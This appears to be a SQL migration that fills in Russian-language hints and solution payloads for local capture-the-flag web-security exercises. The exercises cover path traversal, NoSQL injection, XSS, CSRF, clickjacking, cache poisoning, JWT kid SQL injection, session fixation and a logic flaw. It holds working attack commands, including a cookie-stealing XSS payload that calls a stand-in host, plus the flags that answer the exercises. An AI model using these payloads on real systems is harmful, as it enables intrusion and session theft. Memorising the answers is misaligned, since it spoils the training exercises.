  solution_payload = $mv$curl 'http://localhost:4000/api/inventory/files?name=readme.txt'
curl 'http://localhost:4000/api/inventory/files?name=../../../var/www/flags/inventory.txt'
# ../ выводит из /srv/inventory/files, том флагов смонтирован в /var/www/flags
# ожидаемый результат: text/plain и строка MV{INVENTORY_PATH_TRAVERSAL_b7c8837e}$mv$
WHERE slug = 'inventory-path-traversal';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — NoSQL-инъекция: тело запроса целиком уходит в фильтр MongoDB, поэтому вместо строки можно передать объект-оператор. Ищите вход в Partner Portal на шлюзе localhost:4000: эндпоинт POST /api/partner/login, поля username и password. Первый шаг — отправить обычный вход с парой partner/partner123 и убедиться, что ответ 200 и содержит поле flag.$mv$,
  hint_2 = $mv$Отправьте POST http://localhost:4000/api/partner/login с Content-Type: application/json и телом {"username":{"$ne":null},"password":{"$ne":null}}. Оператор $ne значит «не равно», поэтому фильтр найдёт первую запись partner_users (admin), и сервер вернёт 200, token, user и поле flag. Промежуточно можно сузить обход до {"username":"admin","password":{"$ne":null}}.$mv$,
  solution_payload = $mv$curl -s -X POST http://localhost:4000/api/partner/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
# В ответе 200 придут token, user {"username":"admin","role":"admin"} и поле flag.
# Ожидаемый результат: MV{NOSQL_AUTH_BYPASS_102eaa9d}$mv$
WHERE slug = 'nosql-auth-bypass';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс уязвимости — слепая NoSQL-инъекция в MongoDB: пароль из тела запроса целиком уходит в findOne, поэтому вместо строки можно передать объект-оператор. Ищите в api-gateway: services/api-gateway/src/routes/partner.js, эндпоинт POST http://localhost:4000/api/partner/login, коллекция partner_users. Первый шаг: отправьте обычный строковый пароль и убедитесь, что неверный даёт 401, а верный — 200. Разные ответы и есть оракул.$mv$,
  hint_2 = $mv$Отправьте POST на http://localhost:4000/api/partner/login с заголовком Content-Type: application/json и телом {"username":"admin","password":{"$regex":"^V"}}. Ответ 200 с полем flag означает, что префикс верен, 401 — что неверен. Далее наращивайте шаблон по одному символу: ^Va, ^Vau и так далее. В конце добавьте $, чтобы убедиться, что пароль закончился.$mv$,
  solution_payload = $mv$# 401 — префикс неверен, 200 — верен; наращивайте по символу
for p in V Va Vau Vaul; do curl -s -o /dev/null -w "$p %{http_code}\n" -H "Content-Type: application/json" -d "{\"username\":\"admin\",\"password\":{\"\$regex\":\"^$p\"}}" http://localhost:4000/api/partner/login; done
curl -s -H "Content-Type: application/json" -d '{"username":"admin","password":{"$regex":"^VaultAdmin#2026$"}}' http://localhost:4000/api/partner/login
# ожидаемый результат: {"user":{"username":"admin","role":"admin"},"flag":"MV{NOSQL_BLIND_6317de85}"}$mv$
WHERE slug = 'nosql-blind';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — DOM XSS: значение из адресной строки попадает в HTML без экранирования. Смотрите localhost:3000/search: параметр q читается через useSearchParams, а блок .search-echo выводит его через dangerouslySetInnerHTML (services/frontend/src/pages/Search.jsx). Первый шаг: откройте /search?q=test и в DevTools → Elements проверьте, попадает ли текст в разметку как HTML.$mv$,
  hint_2 = $mv$Войдите как student/student123 на localhost:3000/login: без сессии /api/frontend/bootstrap отвечает 401. Откройте /search?q=test — страница сама запросит /api/frontend/bootstrap?page=search и получит Set-Cookie dom_xss_flag с Path=/search и без HttpOnly. Проверьте в DevTools → Console командой document.cookie: на этой странице значение видно. Именно его и крадёт DOM XSS через параметр q.$mv$,
  solution_payload = $mv$# 1) открыть поиск под сессией, чтобы пришла cookie с флагом
curl -s -c j.txt -X POST localhost:4000/api/session/login -H 'Content-Type: application/json' -d '{"username":"student","password":"student123"}'
curl -s -b j.txt -D - -o /dev/null 'localhost:4000/api/frontend/bootstrap?page=search' | grep -o 'MV{[^}]*}'
# 2) в браузере: /search?q=<img src=x onerror="fetch('//evil/?'+document.cookie)">
# в cookie dom_xss_flag лежит MV{DOM_XSS_1a718519}$mv$
WHERE slug = 'dom-xss';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — CSRF: смена email привязана только к cookie-сессии, отдельного токена подтверждения нет. Ищите на странице профиля http://localhost:3000/profile, блок «Контактный email». Запрос уходит на шлюз: POST http://localhost:4000/api/profile/email с JSON-полем email. Первый шаг: войдите как student/student123, откройте DevTools → Network и сохраните новый email. В запросе есть cookie connect.sid, но нет CSRF-токена.$mv$,
  hint_2 = $mv$Войдите как student: POST http://localhost:4000/api/session/login с JSON {"username":"student","password":"student123"} — сохраните cookie connect.sid. Затем отправьте POST http://localhost:4000/api/profile/email с заголовками Content-Type: application/json и Origin: https://evil.example, тело {"email":"attacker@evil.example"}. Меняйте значение Origin: при чужом домене (или заголовке Sec-Fetch-Site: cross-site) сервер считает запрос межсайтовым. Ожидайте ответ с полем flag.$mv$,
  solution_payload = $mv$curl -s -c jar.txt -H 'Content-Type: application/json' -d '{"username":"student","password":"student123"}' http://localhost:4000/api/session/login
curl -s -b jar.txt -H 'Content-Type: application/json' -H 'Origin: https://evil.example' -d '{"email":"attacker@evil.example"}' http://localhost:4000/api/profile/email
# ответ: {"ok":true,"email":"attacker@evil.example","flag":"MV{CSRF_PROFILE_CHANGE_...}"}
# email изменён без CSRF-токена$mv$
WHERE slug = 'csrf-profile-change';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — Clickjacking: подтверждение заказа можно встроить в iframe и заставить нажать. Смотрите services/api-gateway/src/routes/frontend.js, эндпоинт POST /api/checkout/confirm: он проверяет только признак встраивания и не запрещает framing ни на одном ответе. Первый шаг: откройте http://localhost:3000/checkout, войдите как student/student123 и в DevTools → Network посмотрите запрос подтверждения заказа.$mv$,
  hint_2 = $mv$Соберите страницу-приманку на другом origin: iframe с src="http://localhost:3000/checkout" и поверх прозрачная кнопка. Страница подтверждения отправит POST /api/checkout/confirm; сервер смотрит заголовок Sec-Fetch-Dest: iframe или поле framed:true и в этом случае отдаёт флаг. Сначала проверьте вручную: POST http://localhost:4000/api/checkout/confirm с cookie сессии и телом {"framed":true} — придёт flag. Затем оформите это как iframe.$mv$,
  solution_payload = $mv$# сессия student и подтверждение внутри iframe
curl -s -c j.txt -X POST localhost:4000/api/session/login -H 'Content-Type: application/json' -d '{"username":"student","password":"student123"}'
curl -s -b j.txt -X POST localhost:4000/api/checkout/confirm -H 'Content-Type: application/json' -d '{"framed":true}'
# ответ: {"confirmed":true,"flag":"MV{CLICKJACKING_...}"}
# В браузере: <iframe src="http://localhost:3000/checkout"> на чужой странице$mv$
WHERE slug = 'clickjacking-checkout';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — postMessage XSS: обработчик события message в React-странице поддержки принимает данные из любого окна. Ищите в services/frontend/src/pages/Support.jsx: в useEffect на window вешается обработчик, который не сверяет event.origin, а строку сообщения кладёт в dangerouslySetInnerHTML (поле raw). Первый шаг: войдите как student/student123 и откройте http://localhost:3000/support.$mv$,
  hint_2 = $mv$Сначала войдите: POST http://localhost:4000/api/session/login с телом {"username":"student","password":"student123"} — флаг в cookie pm_xss_flag (path /support, без HttpOnly). Затем сделайте внешнюю страницу другого origin: iframe с src="http://localhost:3000/support", внутрь пошлите postMessage со строкой вида <img src=x onerror="alert(document.cookie)"> с targetOrigin "*". Загрузите её через POST http://localhost:4000/legacy/upload.php и откройте выданный /legacy/uploads/...; шлите сообщения повторно.$mv$,
  solution_payload = $mv$printf '%s' '<iframe id=f src="http://localhost:3000/support"></iframe><script>setInterval(()=>f.contentWindow.postMessage("<img src=x onerror=alert(document.cookie)>","*"),700)</script>' > pm.html
curl -s -F 'file=@pm.html' http://localhost:4000/legacy/upload.php
# 2) войдите student/student123 на http://localhost:3000 и откройте
# http://localhost:4000/legacy/uploads/pm.html
# результат: alert с pm_xss_flag=MV{POSTMESSAGE_XSS_0cd6682a}$mv$
WHERE slug = 'postmessage-xss';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — Cache Poisoning: ключ кэша не учитывает заголовок, влияющий на тело ответа. Ищите в шлюзе api-gateway: маршрут GET http://localhost:4000/api/landing. Ответ кэшируется в Redis по постоянному ключу gw:cache:/api/landing, а в HTML подставляется заголовок X-Forwarded-Host. Первый шаг: отправьте GET с заголовком X-Forwarded-Host и сравните ссылку в ответе с тем, что отдаёт тот же путь без заголовка.$mv$,
  hint_2 = $mv$План проверки. 1) Отравьте кэш: curl -s http://localhost:4000/api/landing -H "X-Forwarded-Host: evil.example". В ответе ссылка «Перейти к оформлению» будет вести на подменённый хост, а значение сохранится в Redis на 300 секунд. 2) Сразу запросите тот же путь без заголовка. 3) Смотрите HTML: ссылка осталась на evil.example, а в конце появился комментарий с флагом, так как сохранённый хост не равен текущему Host.$mv$,
  solution_payload = $mv$curl -s http://localhost:4000/api/landing -H "X-Forwarded-Host: evil.example" >/dev/null
curl -s http://localhost:4000/api/landing
# Ожидаемый результат: в HTML ссылка http://evil.example/checkout и искомый флаг
# Флаг вида MV{CACHE_POISONING_xxxxxxxx} возвращается в HTML-комментарии в конце.$mv$
WHERE slug = 'cache-poisoning';

UPDATE academy.challenges SET
  hint_1 = $mv$Ошибка класса SQL-инъекция через заголовок токена. В auth-service проверка JWT выбирает ключ из таблицы auth.jwt_keys по полю kid, подставляя его в SQL конкатенацией. Войдите как student на localhost:3000/login, откройте DevTools, найдите в localStorage ключ mv_token и декодируйте заголовок токена. Штатный токен поля kid не содержит, добавьте его сами.$mv$,
  hint_2 = $mv$Сначала POST http://localhost:4000/api/auth/login с JSON {"username":"student","password":"student123"} и возьмите access_token и user.id. Затем соберите свой HS256-токен: в payload поля sub, username student и role admin, в заголовок добавьте kid вида nope' UNION SELECT 'pwned-secret' -- и подпишите его ключом pwned-secret. Отправьте GET http://localhost:4000/api/auth/me с заголовком Authorization: Bearer <токен>.$mv$,
  solution_payload = $mv$# нужен pyjwt: pip install pyjwt
python3 - <<'PY' > /tmp/kid.jwt
import jwt
print(jwt.encode(
    {"sub": "11111111-1111-1111-1111-111111111111", "username": "student", "role": "admin"},
    "pwned-secret", algorithm="HS256",
    headers={"kid": "nope' UNION SELECT 'pwned-secret' -- "},
))
PY
curl -s http://localhost:4000/api/auth/me -H "Authorization: Bearer $(cat /tmp/kid.jwt)"
# ожидаемый результат: token.role=admin, flag=MV{JWT_KID_INJECTION_...}$mv$
WHERE slug = 'jwt-kid-injection';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — бизнес-логика: число из запроса не проверяют на знак. Ищите в inventory-service: POST /api/inventory/cart/checkout через http://localhost:4000. Он принимает JSON с productId и quantity, считает total = price * quantity и вычитает total из баланса кошелька. Первый шаг: войдите как student (student/student123), возьмите access_token и проверьте баланс через GET /api/inventory/wallet.$mv$,
  hint_2 = $mv$Подставьте токен student в заголовок Authorization: Bearer <токен>. Возьмите товар с известной ценой, например productId 1, и отправьте POST http://localhost:4000/api/inventory/cart/checkout с заголовком Content-Type: application/json и телом {"productId":1,"quantity":-1}. Отрицательное количество даёт total = price * (-1), проверка total > balance не срабатывает, а из баланса вычитается отрицательное число. В ответе смотрите total, balance и flag.$mv$,
  solution_payload = $mv$TOKEN=$(curl -s -X POST http://localhost:4000/api/auth/login -H 'Content-Type: application/json' -d '{"username":"student","password":"student123"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
curl -s -X POST http://localhost:4000/api/inventory/cart/checkout -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"productId":1,"quantity":-5}'
# Результат: {"orderId":...,"total":-19999500,"balance":...,"flag":"MV{INVENTORY_NEGATIVE_QUANTITY_980cc06b}"}$mv$
WHERE slug = 'inventory-negative-quantity';

UPDATE academy.challenges SET
  hint_1 = $mv$Класс ошибки — Session Fixation: сервер принимает идентификатор сессии, присланный клиентом, и не выдаёт новый после входа. Ищите в auth-service эндпоинт POST /api/auth/session: он читает cookie sid, создаёт запись в Redis и при определённом сценарии сохраняет её за гостем. Первый шаг: посмотрите, что приходит в Set-Cookie после POST /api/auth/session без sid.$mv$,
  hint_2 = $mv$План: 1) Отправьте POST http://localhost:4000/api/auth/session без cookie — в ответе придёт sid и authenticated:false. 2) Повторите запрос, передав этот sid в cookie: сервер переиспользует его. 3) Затем войдите как student/student123 с этим же sid (POST /api/auth/login, cookie sid=<тот же>) и проверьте GET /api/auth/session с cookie: сессия остаётся прежней, а в ответе появляется flag. Значение из шага 1 — «зафиксированный» идентификатор жертвы.$mv$,
  solution_payload = $mv$# 1) получаем sid и запоминаем его
SID=$(curl -s -c s.txt -X POST http://localhost:4000/api/auth/session | jq -r .sid)
# 2) «жертва» входит с этим же sid
curl -s -b "sid=$SID" -X POST http://localhost:4000/api/auth/login -H 'Content-Type: application/json' -d '{"username":"student","password":"student123"}'
# 3) проверяем, что сессия переиспользована
curl -s -b "sid=$SID" http://localhost:4000/api/auth/session
# ожидаемый результат: authenticated=true и flag MV{SESSION_FIXATION_...}$mv$
WHERE slug = 'session-fixation';
